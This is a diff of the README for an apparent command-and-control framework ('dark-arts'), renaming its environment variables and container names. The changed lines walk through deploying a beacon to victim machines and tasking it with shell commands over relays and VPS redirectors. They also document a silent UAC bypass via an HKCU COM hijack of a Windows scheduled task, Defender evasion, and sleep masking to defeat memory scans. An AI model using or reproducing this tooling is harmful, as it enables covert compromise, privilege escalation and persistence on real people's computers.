@@ -52,7 +52,7 @@ Data flow:
 
 ### Crypto model
 
-- **Identities:** ed25519 keypairs derived from seeds. The server has one (`DARKARTS_SERVER_SEED`); every agent has one; the operator signs tasks and stage drops with another (`-operator-pub`).
+- **Identities:** ed25519 keypairs derived from seeds. The server has one (`DARK_ARTS_SERVER_SEED`); every agent has one; the operator signs tasks and stage drops with another (`-operator-pub`).
 - **Session IDs:** `sid = sha256(agent_public_key)[:16]` (32 hex chars). Sessions are registered on the server by `touch <sid> <agent_pub_hex>`.
 - **Sessions:** X25519 ECDH between agent and server identities, HKDF-ratcheted per send; every envelope is AEAD-authenticated — an observer, the edge, or a seized relay cannot read or forge tasking.
 - **Counters:** each envelope carries a monotonic send counter. Server and beacon persist them; on startup the beacon calls `SkipSend(n)` so its ratchet catches up, and the server replays tasks with `since=N` so nothing is delivered twice or lost. After a restore, wipe the edge store so stale blobs cannot inflate a fresh beacon's `last_task` past new counters.
@@ -102,19 +102,19 @@ docker compose -f lab/docker-compose.yml ps
 
 | Container | IP | Host ports |
 |---|---|---|
-| `darkarts-dns` | 10.0.42.200 | 127.0.0.1:5553/udp+tcp (DNS) |
-| `darkarts-minio` | egress | 127.0.0.1:9000 (S3), 9001 (console) |
-| `darkarts-edge` | 10.0.43.210 | 127.0.0.1:8443 (HTTPS) |
-| `darkarts-relay` | 10.0.42.210 (+egress) | 127.0.0.1:7443 |
-| `darkarts-server` | egress | 127.0.0.1:9002 (API) |
-| `darkarts-tunnel` | egress | — (Cloudflare quick tunnel → relay :7443; URL in `docker logs`) |
-| `darkarts-victim1..3` | 10.0.42.3+ | — |
+| `dark-arts-dns` | 10.0.42.200 | 127.0.0.1:5553/udp+tcp (DNS) |
+| `dark-arts-minio` | egress | 127.0.0.1:9000 (S3), 9001 (console) |
+| `dark-arts-edge` | 10.0.43.210 | 127.0.0.1:8443 (HTTPS) |
+| `dark-arts-relay` | 10.0.42.210 (+egress) | 127.0.0.1:7443 |
+| `dark-arts-server` | egress | 127.0.0.1:9002 (API) |
+| `dark-arts-tunnel` | egress | — (Cloudflare quick tunnel → relay :7443; URL in `docker logs`) |
+| `dark-arts-victim1..3` | 10.0.42.3+ | — |
 
-Networks: `darkarts-net-lan` (10.0.42.0/24 — victims and relay) and `darkarts-net-egress` (10.0.43.0/24 — edge, minio, server). The relay spans both; victims resolve `edge.darkarts.lab` to the relay via Docker `extra_hosts` and via the lab zone:
+Networks: `dark-arts-net-lan` (10.0.42.0/24 — victims and relay) and `dark-arts-net-egress` (10.0.43.0/24 — edge, minio, server). The relay spans both; victims resolve `edge.darkarts.lab` to the relay via Docker `extra_hosts` and via the lab zone:
 
 ```sh
-docker exec darkarts-dns dig @127.0.0.1 +short TXT _dd.darkarts.lab   # ph0-deaddrop-ok
-docker exec darkarts-dns dig @127.0.0.1 +short A edge.darkarts.lab    # 10.0.42.210
+docker exec dark-arts-dns dig @127.0.0.1 +short TXT _dd.darkarts.lab   # ph0-deaddrop-ok
+docker exec dark-arts-dns dig @127.0.0.1 +short A edge.darkarts.lab    # 10.0.42.210
 curl http://127.0.0.1:8443/healthz     # ok   (edge)
 curl http://127.0.0.1:7443/healthz     # ok   (relay)
 curl -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8443/          # 200 (cover page)
@@ -130,15 +130,15 @@ curl -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8443/nope      # 404 (ngi
 The lab ships with fixed identities. The server's seed is `0101…01` (its public key is `a4e09292b651c278b9772c569f5fa9bb13d906b46ab68c9df9dc2b4409f8a209`); the API key is `opkey`.
 
 ```sh
-docker cp beacon darkarts-victim1:/tmp/beacon
-docker exec -u root darkarts-victim1 chmod +x /tmp/beacon
-docker exec -d darkarts-victim1 sh -c \
-  'DARKARTS_SEED=0202020202020202020202020202020202020202020202020202020202020202 \
-   DARKARTS_SERVER_PUB=a4e09292b651c278b9772c569f5fa9bb13d906b46ab68c9df9dc2b4409f8a209 \
-   DARKARTS_EDGE=http://edge.darkarts.lab:7443 \
-   DARKARTS_STATE_DIR=/tmp/beacon-state \
-   DARKARTS_SLEEP=2 DARKARTS_MIMIC=true /tmp/beacon > /tmp/beacon.log 2>&1'
-docker exec darkarts-victim1 cat /tmp/beacon.log
+docker cp beacon dark-arts-victim1:/tmp/beacon
+docker exec -u root dark-arts-victim1 chmod +x /tmp/beacon
+docker exec -d dark-arts-victim1 sh -c \
+  'DARK_ARTS_SEED=0202020202020202020202020202020202020202020202020202020202020202 \
+   DARK_ARTS_SERVER_PUB=a4e09292b651c278b9772c569f5fa9bb13d906b46ab68c9df9dc2b4409f8a209 \
+   DARK_ARTS_EDGE=http://edge.darkarts.lab:7443 \
+   DARK_ARTS_STATE_DIR=/tmp/beacon-state \
+   DARK_ARTS_SLEEP=2 DARK_ARTS_MIMIC=true /tmp/beacon > /tmp/beacon.log 2>&1'
+docker exec dark-arts-victim1 cat /tmp/beacon.log
 ```
 
 The beacon derives `sid = sha256(agent_pub)[:16]` from its seed and logs it (for seed `0202…02`: `cfa570c653bd212b10a9cb551fd7a1b4`). Register the session with the server:
@@ -155,9 +155,9 @@ To use a fresh seed, generate the identity with `go run ./cmd/genid <64-hex-seed
 
 ```sh
 go build -o console.exe ./cmd/console
-set DARKARTS_SERVER_URL=http://127.0.0.1:9002   # $env: on PowerShell
-set DARKARTS_API_KEY=opkey
-set DARKARTS_OP_ID=op-lab
+set DARK_ARTS_SERVER_URL=http://127.0.0.1:9002   # $env: on PowerShell
+set DARK_ARTS_API_KEY=opkey
+set DARK_ARTS_OP_ID=op-lab
 .\console.exe
 ```
 
@@ -201,10 +201,10 @@ Issue a task, then confirm the result:
 ```sh
 curl -s -X POST http://127.0.0.1:9002/api/v1/tasks \
   -H 'Authorization: Bearer opkey' -H 'Content-Type: application/json' \
-  -d '{"session_id":"cfa570c653bd212b10a9cb551fd7a1b4","op_id":"op-lab","type":"shell","params":{"cmd":"echo darkarts-e2e-ok"},"signed_by":"op-lab"}'
+  -d '{"session_id":"cfa570c653bd212b10a9cb551fd7a1b4","op_id":"op-lab","type":"shell","params":{"cmd":"echo dark-arts-e2e-ok"},"signed_by":"op-lab"}'
 curl -s http://127.0.0.1:9002/api/v1/results -H 'Authorization: Bearer opkey'   # output is base64
-docker exec darkarts-victim1 cat /tmp/beacon-state/state.json                  # {"send_pos":1,"last_task":1}
-docker exec darkarts-minio sh -c 'mc alias set m http://127.0.0.1:9000 darkarts darkarts-lab >/dev/null 2>&1; mc ls -r m/darkarts'
+docker exec dark-arts-victim1 cat /tmp/beacon-state/state.json                  # {"send_pos":1,"last_task":1}
+docker exec dark-arts-minio sh -c 'mc alias set m http://127.0.0.1:9000 darkarts dark-arts-lab >/dev/null 2>&1; mc ls -r m/darkarts'
 ```
 
 You should see one `server/00000000000000000000` blob (the task) and one `beacon/00000000000000000000` blob (the result) per session under their `sid/` prefixes in MinIO.
@@ -262,7 +262,7 @@ The walkthrough covers a same-network laptop. For a target on foreign WiFi or a 
 
 **Before the console (one-time VPS prep):**
 
-1. Create a Debian/Ubuntu VPS and open **TCP 443** (and 80 while certbot runs) in the *provider* firewall — OCI security list, GCP VPC rule (`gcloud compute firewall-rules create darkarts-443 --allow tcp:443,tcp:80 ...`); a VM-level ufw rule alone is not enough.
+1. Create a Debian/Ubuntu VPS and open **TCP 443** (and 80 while certbot runs) in the *provider* firewall — OCI security list, GCP VPC rule (`gcloud compute firewall-rules create dark-arts-443 --allow tcp:443,tcp:80 ...`); a VM-level ufw rule alone is not enough.
 2. `dark-arts> sshkey` — paste the printed public key into the VPS's `authorized_keys` (or the provider's launch form).
 3. Give the SSH user passwordless sudo (`echo "<user> ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/<user>`) or `redirector` dies at `apt-get update`.
 
@@ -324,23 +324,23 @@ The script prints the generated seed (keep it to redeploy the same identity late
 | `-Insecure` | bake `cfgInsecure=true`: skip TLS certificate verification (needed for self-signed redirector certs) |
 | `-SkipRegister` | build only; print the `POST /api/v1/sessions` line to run later |
 
-This builds a **self-contained `beacon.exe`** (stealth recipe) with the seed, server public key, edge candidate list, 15 s sleep and a `beacon.log` next to it baked in via `-ldflags -X`. The target user just copies the single exe and double-clicks it — no environment variables, no launcher script. `DARKARTS_*` variables still take precedence when set (a comma-separated `DARKARTS_EDGE` overrides the baked list). The script prints the identity and **registers the session itself** (`POST /api/v1/sessions` is idempotent, so re-running just re-touches it). Results appear under the new sid. Use `-NoInject` to build a beacon without the inject TTP if the target's AV objects. Generate identities with `go run ./cmd/genid <seed-hex-64>`.
+This builds a **self-contained `beacon.exe`** (stealth recipe) with the seed, server public key, edge candidate list, 15 s sleep and a `beacon.log` next to it baked in via `-ldflags -X`. The target user just copies the single exe and double-clicks it — no environment variables, no launcher script. `DARK_ARTS_*` variables still take precedence when set (a comma-separated `DARK_ARTS_EDGE` overrides the baked list). The script prints the identity and **registers the session itself** (`POST /api/v1/sessions` is idempotent, so re-running just re-touches it). Results appear under the new sid. Use `-NoInject` to build a beacon without the inject TTP if the target's AV objects. Generate identities with `go run ./cmd/genid <seed-hex-64>`.
 
 ### Operate from the console
 
-See the command reference in [Quick start](#5-operate-with-the-console) and the walkthrough above; `lab\console.cmd` sets the right `DARKARTS_SERVER_URL`/`DARKARTS_API_KEY`.
+See the command reference in [Quick start](#5-operate-with-the-console) and the walkthrough above; `lab\console.cmd` sets the right `DARK_ARTS_SERVER_URL`/`DARK_ARTS_API_KEY`.
 
 ### Silent elevation (`uac`) — the zero-prompt daily channel
 
 The `uac` task runs a command with a full elevated token. The default method (`daily`) is **fully silent — no UAC prompt ever**:
 
-- **Mechanism:** the stock Win11 24H2+ `UnifiedConsentSyncTask` (`\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`) is a Group/BA, `HighestAvailable`, non-idle-gated task with a daily `TimeTrigger` (12:00±2h, `StartWhenAvailable` — also fires at wake-up) that runs **in the interactive user's session** and activates its ComHandler CLSID `{82AA0895-198A-4C1B-B2D1-C16894218AFB}` at HIGH. The beacon drops a payload DLL at `%TEMP%\darts_ucd.dll` and points the **HKCU override** for that CLSID at it (HKLM still owns the real handler, so scheduler validation passes, but user-session activation consults HKCU first — verified live in the lab). On each daily fire the DLL loads at HIGH, bootstraps the reusable `\DarkArts-uac` HIGHEST task (InteractiveToken, no triggers, hidden), and runs the pending command; it then returns `REGDB_E_CLASSNOTREG`, so the host reports a benign activation failure.
+- **Mechanism:** the stock Win11 24H2+ `UnifiedConsentSyncTask` (`\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`) is a Group/BA, `HighestAvailable`, non-idle-gated task with a daily `TimeTrigger` (12:00±2h, `StartWhenAvailable` — also fires at wake-up) that runs **in the interactive user's session** and activates its ComHandler CLSID `{82AA0895-198A-4C1B-B2D1-C16894218AFB}` at HIGH. The beacon drops a payload DLL at `%TEMP%\darts_ucd.dll` and points the **HKCU override** for that CLSID at it (HKLM still owns the real handler, so scheduler validation passes, but user-session activation consults HKCU first — verified live in the lab). On each daily fire the DLL loads at HIGH, bootstraps the reusable `\dark-arts-uac` HIGHEST task (InteractiveToken, no triggers, hidden), and runs the pending command; it then returns `REGDB_E_CLASSNOTREG`, so the host reports a benign activation failure.
 - **First invocation** arms the channel and waits up to ~26h for the next fire (the beacon's task loop is busy meanwhile). **After the first fire the reusable task exists and every `uac` command returns in ~2–5 s** via a silent `schtasks /run`.
 - **Fallbacks:** `method=schtasks` (one-time ShellExecute `runas` prompt, then silent forever), plus the classic `cmluautil`/`fodhelper`/`computerdefaults` methods.
-- **Verify on the laptop after a fire:** `type %TEMP%\uc_daily_marker.txt` (`il=1` lines = loaded at HIGH, last line `done`), `schtasks /query /tn \DarkArts-uac`, `reg query "HKCU\Software\Classes\CLSID\{82AA0895-198A-4C1B-B2D1-C16894218AFB}\InprocServer32"` (→ `%TEMP%\darts_ucd.dll`).
+- **Verify on the laptop after a fire:** `type %TEMP%\uc_daily_marker.txt` (`il=1` lines = loaded at HIGH, last line `done`), `schtasks /query /tn \dark-arts-uac`, `reg query "HKCU\Software\Classes\CLSID\{82AA0895-198A-4C1B-B2D1-C16894218AFB}\InprocServer32"` (→ `%TEMP%\darts_ucd.dll`).
 - **Console automation:** `uactest <sid> [cmd]` issues the task and watches for the result (prints the checklist + troubleshooting if the first fire hasn't happened yet); `uacdll` recompiles the payload from `pkg/beacon/uacdll/darts_ucd.c` when it changes (then `package -Seed <seed>` to bake it in).
 - **Caveats:** requires Win11 24H2+ (no `UnifiedConsentSyncTask` on Win10 — use `method=schtasks`); the laptop user must be logged on; Defender must not flag the DLL (rebuild from a clean gcc if it does; keep the DLL out of Go c-shared builds — those get ML-flagged).
-- **Teardown:** delete the HKCU override key, `%TEMP%\darts_ucd.dll`, `%TEMP%\darts-uac-work.txt`, and the `\DarkArts-uac` task.
+- **Teardown:** delete the HKCU override key, `%TEMP%\darts_ucd.dll`, `%TEMP%\darts-uac-work.txt`, and the `\dark-arts-uac` task.
 
 ## Cross-network deployment (VPS redirector)
 
@@ -353,8 +353,8 @@ The production-grade path (Sliver/CS-style): a VPS terminates TLS on 443 and for
 ```
 
 - nginx terminates HTTPS :443 → plain HTTP → `<lab-host-ip>:7443` (the relay; no relay changes needed).
-- The lab host's Windows firewall must allow inbound TCP 7443 from the VPS: `New-NetFirewallRule -DisplayName "darkarts-relay" -Direction Inbound -Protocol TCP -LocalPort 7443 -Action Allow`.
-- Oracle Cloud free tier (and AWS/GCP/Azure): works — `setup.sh` handles both apt (Ubuntu) and dnf (Oracle Linux). Two provider-specific steps: add an ingress rule for TCP 443 (and 80 while certbot runs) in the OCI **security list** (GCP: a VPC firewall rule — `gcloud compute firewall-rules create darkarts-443 --allow tcp:443,tcp:80 --direction INGRESS --source-ranges 0.0.0.0/0`); VM-level ufw alone is not enough. And the lab host must be reachable from the VPS on 7443 (home NAT: router port-forward, or CG-NAT breaks it — verify with `nc -vz <lab-ip> 7443` from the VPS).
+- The lab host's Windows firewall must allow inbound TCP 7443 from the VPS: `New-NetFirewallRule -DisplayName "dark-arts-relay" -Direction Inbound -Protocol TCP -LocalPort 7443 -Action Allow`.
+- Oracle Cloud free tier (and AWS/GCP/Azure): works — `setup.sh` handles both apt (Ubuntu) and dnf (Oracle Linux). Two provider-specific steps: add an ingress rule for TCP 443 (and 80 while certbot runs) in the OCI **security list** (GCP: a VPC firewall rule — `gcloud compute firewall-rules create dark-arts-443 --allow tcp:443,tcp:80 --direction INGRESS --source-ranges 0.0.0.0/0`); VM-level ufw alone is not enough. And the lab host must be reachable from the VPS on 7443 (home NAT: router port-forward, or CG-NAT breaks it — verify with `nc -vz <lab-ip> 7443` from the VPS).
 - Then build the package against it (multi-edge keeps the LAN path for same-network beacons):
 
 ```powershell
@@ -373,7 +373,7 @@ dark-arts> redirector user@203.0.113.5        # provision nginx TLS :443 -> lab 
 dark-arts> redirector -Reverse user@203.0.113.5   # same, but the VPS forwards into an outbound SSH tunnel
 ```
 
-`redirector` requires key-based SSH to the VPS (the console `sshkey` command generates/prints the key to paste), passwordless sudo for the SSH user, and the provider's firewall open on 443 (see below); it auto-detects the lab host IP, provisions nginx (`lab/redirector/setup.sh` via ssh), verifies the forward, then builds a package with edges `https://<vps>:443,http://<lab-ip>:7443 -Insecure` and registers it. A non-elevated console skips the Windows firewall rule (run elevated or add `New-NetFirewallRule -DisplayName "darkarts-relay" -Direction Inbound -Protocol TCP -LocalPort 7443 -Action Allow`).
+`redirector` requires key-based SSH to the VPS (the console `sshkey` command generates/prints the key to paste), passwordless sudo for the SSH user, and the provider's firewall open on 443 (see below); it auto-detects the lab host IP, provisions nginx (`lab/redirector/setup.sh` via ssh), verifies the forward, then builds a package with edges `https://<vps>:443,http://<lab-ip>:7443 -Insecure` and registers it. A non-elevated console skips the Windows firewall rule (run elevated or add `New-NetFirewallRule -DisplayName "dark-arts-relay" -Direction Inbound -Protocol TCP -LocalPort 7443 -Action Allow`).
 
 ### Reverse mode (lab host behind NAT/CG-NAT — e.g. on public WiFi)
 
@@ -389,16 +389,16 @@ The command provisions nginx with upstream `127.0.0.1:7443`, starts `lab\redirec
 
 Debian 13 VM, external IP `<vps-ip>` in testing. Two gotchas beyond the generic steps above:
 
-1. **SSH username comes from the key comment.** When you paste a bare public key into the VM's SSH-keys metadata field, GCP derives the OS user from the key's comment field — if your key comment is `darkarts-lab`, the user is `darkarts-lab`, *not* `debian`. `ssh darkarts-lab@<vps-ip>` from the lab host. (A `username:`-prefixed entry gives you that username instead; either is fine as long as you SSH as the user you created.)
+1. **SSH username comes from the key comment.** When you paste a bare public key into the VM's SSH-keys metadata field, GCP derives the OS user from the key's comment field — if your key comment is `dark-arts-lab`, the user is `dark-arts-lab`, *not* `debian`. `ssh dark-arts-lab@<vps-ip>` from the lab host. (A `username:`-prefixed entry gives you that username instead; either is fine as long as you SSH as the user you created.)
 2. **The SSH user needs passwordless sudo** or `setup.sh` dies at `apt-get update` with `Permission denied` on `/var/lib/apt/lists/lock` (the script now detects this and prints a hint). From the GCP browser SSH session (that user has sudo), run once:
    ```bash
-   sudo bash -c 'echo "darkarts-lab ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/darkarts-lab && chmod 440 /etc/sudoers.d/darkarts-lab'
+   sudo bash -c 'echo "dark-arts-lab ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/dark-arts-lab && chmod 440 /etc/sudoers.d/dark-arts-lab'
    ```
-   then re-run `dark-arts> redirector -Reverse darkarts-lab@<vps-ip>`. The whole `redirector -Reverse` run is idempotent — re-running just re-installs, re-verifies and rebuilds. End-to-end verification in testing was `healthz 200` pulled from the VPS through the running tunnel.
+   then re-run `dark-arts> redirector -Reverse dark-arts-lab@<vps-ip>`. The whole `redirector -Reverse` run is idempotent — re-running just re-installs, re-verifies and rebuilds. End-to-end verification in testing was `healthz 200` pulled from the VPS through the running tunnel.
 
 ### The Cloudflare quick tunnel (stopgap, deprecated)
 
-The lab ships a `tunnel` container exposing the relay on an account-less public URL (`docker logs darkarts-tunnel | grep trycloudflare`), but the URL rotates on restart and the tunnels get throttled (observed dead after ~13 h). Use the VPS redirector for anything real.
+The lab ships a `tunnel` container exposing the relay on an account-less public URL (`docker logs dark-arts-tunnel | grep trycloudflare`), but the URL rotates on restart and the tunnels get throttled (observed dead after ~13 h). Use the VPS redirector for anything real.
 
 ## Advanced evasion features
 
@@ -429,7 +429,7 @@ Defender caveat: compile-temp artifacts (`go test` binaries, one early build) ha
 
 The beacon can mask its in-memory key material and payload buffers during every sleep cycle, so a memory scan or crash dump taken while the beacon is idle sees XOR-encrypted bytes at rest and no injected RX pages:
 
-- **Enabling** — bake `-X main.cfgSleepMask=true` (the lab package does this with `-SleepMask`) or set `DARKARTS_SLEEP_MASK=true` at runtime.
+- **Enabling** — bake `-X main.cfgSleepMask=true` (the lab package does this with `-SleepMask`) or set `DARK_ARTS_SLEEP_MASK=true` at runtime.
 - **What gets masked** — the crypto session chains (`pkg/crypto` uses fixed `[keySize]byte` arrays so the backing storage never moves; Go's GC does not scan `[]byte` contents, so XOR-in-place is safe), plus any registered regions such as the inject stub's RX page (registered by `pkg/inject` via `sleepmask.MaskSelfRegion`).
 - **How** — a dedicated non-heap XOR-key page is made writable only for the duration of each mask/unmask cycle (via `NtProtectVirtualMemory`, so it flips RW → NOACCESS when idle and the key page is unreadable while masked). Heap-allocated registrations are XORed in place; non-heap regions (inject RX page) are XORed and set `PAGE_NOACCESS` while masked.
 - **Safety** — a failed unmask (e.g. transient syscall failure) logs a warning and the beacon sleeps unmasked rather than crashing; every cycle is deliberately conservative (mask → sleep → unmask), so an interrupted cycle cannot leave the beacon unwakeable. Verified in the lab: shell/inject/kill round-trip cleanly across hundreds of mask cycles with the RX page registered, and the mask/unmask transitions are observable in the debug log.
@@ -465,16 +465,16 @@ If a compose project was renamed or recreated and stale networks remain, remove 
 
 ## Environment reference
 
-All binaries read `DARKARTS_*` variables. Common ones: `DARKARTS_LOG_LEVEL` (debug|info|warn|error), `DARKARTS_INSECURE=true` (plain HTTP), `DARKARTS_TLS_CERT`/`DARKARTS_TLS_KEY` (optional TLS).
+All binaries read `DARK_ARTS_*` variables. Common ones: `DARK_ARTS_LOG_LEVEL` (debug|info|warn|error), `DARK_ARTS_INSECURE=true` (plain HTTP), `DARK_ARTS_TLS_CERT`/`DARK_ARTS_TLS_KEY` (optional TLS).
 
 | Binary | Variables |
 |---|---|
-| `server` | `DARKARTS_LISTEN` (default `:9000`), `DARKARTS_API_KEY`, `DARKARTS_EDGE`, `DARKARTS_PUMP_INTERVAL`, `DARKARTS_SERVER_SEED`, `DARKARTS_STATE_DIR` |
-| `edge` | `DARKARTS_LISTEN` (`:8443`), `DARKARTS_STORE` (`file`\|`minio`), `DARKARTS_STORE_DIR`, `DARKARTS_COVER_HTML`, `DARKARTS_S3_ENDPOINT`/`DARKARTS_S3_ACCESS_KEY`/`DARKARTS_S3_SECRET_KEY`/`DARKARTS_S3_BUCKET`/`DARKARTS_S3_SECURE` |
-| `relay` | `DARKARTS_RELAY_LISTEN` (`:7443`), `DARKARTS_UPSTREAM` (comma-separated), `DARKARTS_STORE_DIR`, `DARKARTS_RETRY` |
-| `beacon` | `DARKARTS_SEED`, `DARKARTS_SERVER_PUB`, `DARKARTS_EDGE` (comma-separated candidates, tried in order), `DARKARTS_SID` (override), `DARKARTS_SLEEP`, `DARKARTS_JITTER`, `DARKARTS_TASK_TIMEOUT`, `DARKARTS_STATE_DIR`, `DARKARTS_UA`, `DARKARTS_MIMIC`, `DARKARTS_NOISE`, `DARKARTS_SLEEP_MASK` |
-| `console` | `DARKARTS_SERVER_URL` (`http://127.0.0.1:9000`), `DARKARTS_API_KEY`, `DARKARTS_OP_ID` |
-| `stager` | flags `-blob`, `-key`, `-manifest-out`, `-dd-dir`, `-store-dir`, `-ref`, `-operator-pub` (or `DARKARTS_OPERATOR_PUB`), `-loader memory\|child` |
+| `server` | `DARK_ARTS_LISTEN` (default `:9000`), `DARK_ARTS_API_KEY`, `DARK_ARTS_EDGE`, `DARK_ARTS_PUMP_INTERVAL`, `DARK_ARTS_SERVER_SEED`, `DARK_ARTS_STATE_DIR` |
+| `edge` | `DARK_ARTS_LISTEN` (`:8443`), `DARK_ARTS_STORE` (`file`\|`minio`), `DARK_ARTS_STORE_DIR`, `DARK_ARTS_COVER_HTML`, `DARK_ARTS_S3_ENDPOINT`/`DARK_ARTS_S3_ACCESS_KEY`/`DARK_ARTS_S3_SECRET_KEY`/`DARK_ARTS_S3_BUCKET`/`DARK_ARTS_S3_SECURE` |
+| `relay` | `DARK_ARTS_RELAY_LISTEN` (`:7443`), `DARK_ARTS_UPSTREAM` (comma-separated), `DARK_ARTS_STORE_DIR`, `DARK_ARTS_RETRY` |
+| `beacon` | `DARK_ARTS_SEED`, `DARK_ARTS_SERVER_PUB`, `DARK_ARTS_EDGE` (comma-separated candidates, tried in order), `DARK_ARTS_SID` (override), `DARK_ARTS_SLEEP`, `DARK_ARTS_JITTER`, `DARK_ARTS_TASK_TIMEOUT`, `DARK_ARTS_STATE_DIR`, `DARK_ARTS_UA`, `DARK_ARTS_MIMIC`, `DARK_ARTS_NOISE`, `DARK_ARTS_SLEEP_MASK` |
+| `console` | `DARK_ARTS_SERVER_URL` (`http://127.0.0.1:9000`), `DARK_ARTS_API_KEY`, `DARK_ARTS_OP_ID` |
+| `stager` | flags `-blob`, `-key`, `-manifest-out`, `-dd-dir`, `-store-dir`, `-ref`, `-operator-pub` (or `DARK_ARTS_OPERATOR_PUB`), `-loader memory\|child` |
 
 ## Testing
 
@@ -487,10 +487,10 @@ gofmt -l .               # must print nothing
 ## Troubleshooting
 
 - **`stager fetch` rejects the manifest** — `-ref` is the *manifest* ref (printed as `manifest_ref` by `pack`), not the blob ref; and `-operator-pub` is derived from the operator seed via ed25519 (`OperatorKeysFromSeed`), not the X25519 agent identity derivation.
-- **`dig` missing on Windows** — query through the lab container: `docker exec darkarts-dns dig @127.0.0.1 +short TXT _dd.darkarts.lab`.
+- **`dig` missing on Windows** — query through the lab container: `docker exec dark-arts-dns dig @127.0.0.1 +short TXT _dd.darkarts.lab`.
 - **Container fails with "Address already in use"** — a dynamic-IP container grabbed a static IP. Static IPs live at the top of each subnet (…200/…210); if you still collide, `docker compose down` and up again, or remove stale networks first.
 - **Beacon polls but tasks never arrive** — verify the touched session id matches the beacon's logged `sid` exactly (32 hex chars, not the 64-char SHA-256). If `sessions` comes back empty or the pump logs `task authentication failed`, the server no longer has the session's ratchet: re-`touch` the session (or rely on the persisted `state.json`; a deleted state volume needs a fresh touch). Issuing a task to an unregistered session now fails fast with `unknown session: register the session first`.
-- **Session registered, task delivered, but the beacon reports `crypto: authentication failed`** — the beacon's `DARKARTS_SERVER_PUB` does not match the server's seed. Derive it exactly from `DARKARTS_SERVER_SEED` (lab default: `a4e09292b651c278b9772c569f5fa9bb13d906b46ab68c9df9dc2b4409f8a209`).
+- **Session registered, task delivered, but the beacon reports `crypto: authentication failed`** — the beacon's `DARK_ARTS_SERVER_PUB` does not match the server's seed. Derive it exactly from `DARK_ARTS_SERVER_SEED` (lab default: `a4e09292b651c278b9772c569f5fa9bb13d906b46ab68c9df9dc2b4409f8a209`).
 - **Results intermittently missing** — two `beacon.exe` instances running for the same identity (e.g. double-clicked twice) post results to the same blob keys, so every other result lands on a counter the server already consumed and is silently lost. The beacon now takes a single-instance lock (named mutex on Windows) and exits immediately if one is already running — `beacon.log` will show `instance lock: another instance is already running`. Kill all beacon.exe processes and redeploy once.
 - **Result posted but never appears in `/api/v1/results`** — historical counter-collision failure mode, now eliminated: the pump and the beacon delete each blob from the edge store once it is consumed, so a beacon restarted without its state file (reusing counter 0) can no longer collide with a stale blob. If you still see a gap (e.g. from an old store before this fix), purge the sid's `server/` and `beacon/` blobs from the store and restart the server.
 - **Replacing an old beacon whose session has history** — a fresh beacon starts its send counter at 0, but the server's beacon-side counter for that session is already ahead, so the `since` filter strands the new beacon's first results. Reset the session server-side: stop the server, remove the sid from `send`/`sessions` in the server's `state.json` volume, start the server, and re-`touch` the session — then register/deploy the new beacon. Beacon-side state is now per-session (`state-<sid>.json`) so a beacon cannot inherit a previous session's `last_task`/`send_pos` and skip freshly queued tasks.
@@ -499,4 +499,4 @@ gofmt -l .               # must print nothing
 - **`setup.sh` dies at `apt-get update` with `Permission denied`** — the SSH user has no root. Give it passwordless sudo: `sudo bash -c 'echo "<user> ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/<user> && chmod 440 /etc/sudoers.d/<user>'` (from a session that already has sudo), then re-run the `redirector` command.
 - **Beacon keeps probing but no `edge switched` log** — with a single edge candidate the probe is skipped entirely (nothing to fall back to); the `Warn` log only appears when at least two candidates are configured.
 - **`Start-Process` (PowerShell) children lack settings** — environment variables set after spawning are not inherited; set them before `Start-Process` or use `cmd /c`.
-- **Beacon cannot write its state file** — it defaults to `./data/beacon` relative to the working directory; set `DARKARTS_STATE_DIR` to a writable path (e.g. `/tmp/beacon-state`) in containers.
+- **Beacon cannot write its state file** — it defaults to `./data/beacon` relative to the working directory; set `DARK_ARTS_STATE_DIR` to a writable path (e.g. `/tmp/beacon-state`) in containers.
